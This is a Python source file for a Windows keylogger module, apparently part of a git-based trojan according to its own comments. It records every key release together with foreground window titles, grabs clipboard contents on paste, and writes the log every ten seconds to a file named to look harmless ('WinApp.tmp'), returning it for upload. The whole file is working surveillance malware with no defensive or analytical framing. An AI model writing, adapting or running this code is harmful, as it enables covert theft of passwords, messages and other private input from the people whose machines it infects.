# python3 -c "import keylogger; print(keylogger.run())"
import ctypes
import pyperclip
import keyboard
import threading

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi

last_window = None
filename = "WinApp.tmp"

# handle first time calling, dont overwrite keylogger object on second call
if "keylogger" not in locals():
    keylogger = None

def get_current_process():
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # get the process ID
    #pid = c_ulong(0)
    #user32.GetWindowThreadProcessID(hwnd, ctypes.byref(pid))

    # store the current process ID
    #process_id = str(pid.value)

    # grab the executable
    #executable = ctypes.create_string_buffer("\x00" * 512)
    #h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    #psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)

    # read its title
    window_title = ctypes.create_string_buffer(512)
    user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
    
    #info = f"PID: {process_id} - {executable.value} - {window_title.value}n"
    info = f"{window_title.value.decode()}"

    kernel32.CloseHandle(hwnd)
    #kernel32.CloseHandle(h_process)

    return info

class Keylogger:
    def __init__(self):
        self.log = ""
        
    def release_key(self, event):
        global last_window
        current_window = get_current_process()
        print(current_window)

        # check if window changed
        if last_window != current_window:
            last_window = current_window
            self.log += f"[ New Window: {current_window} ]\n"

        name = event.name
        print(str(event.name))

        # not a character, special key (e.g ctrl, alt, etc.)
        if len(name) > 1:
            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            # reformat control keys, i.e. "ctrl" to "[CTRL]"
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += f"{name}\n"
        
    def paste(self):
        print(self.log)
        self.log += pyperclip.paste()
        
    def start(self):
        keyboard.on_release(callback=self.release_key)
        keyboard.add_hotkey("ctrl+v", callback=self.paste)
        self.export()
        
    # gets called from start and then every x, sends current log to file
    def export(self):
        f = open(filename, "a+")
        
        # copy log and erase it, dont wait on slow file write (possible char duplicates / misses)
        temp = self.log
        self.log = ""
        
        f.write(temp)
        f.close()
        
        threading.Timer(interval=10, function=self.export).start()
        
    def get_log(self):
        f = open(filename, "r")
        all = f.read()
        f.close()
        
        return all


# gets called by git_torjan, return current log to upload it to repo
def run(**args):    
    print("[*] Running keylogger module")

    keylogger = Keylogger()
    keylogger.start()
    
    return keylogger.get_log()